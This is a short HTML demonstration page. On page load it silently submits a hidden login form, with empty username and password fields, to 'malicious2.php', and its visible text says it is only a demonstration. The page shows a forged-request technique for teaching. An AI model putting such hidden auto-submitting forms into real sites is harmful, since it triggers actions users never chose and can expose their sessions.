<html>
	<head>
		<title>Login Page</title>
	</head>

	<body onLoad='document.getElementById("evilform").submit()'>
		<div style='display: none'>
			<form id='evilform' action='malicious2.php' method='post'>
				Username <input type='text'     name='username' value='' /><br />
				Password <input type='password' name='password' value='' /><br />
				<input type='submit'   value='Log in' /><br />
			</form>
		</div>

		This page looks perfectly innocent, but if clicked username and password will be submitted.  They just go back to the login page, but that's why this is just a demonstration. 
	</body>
</html>
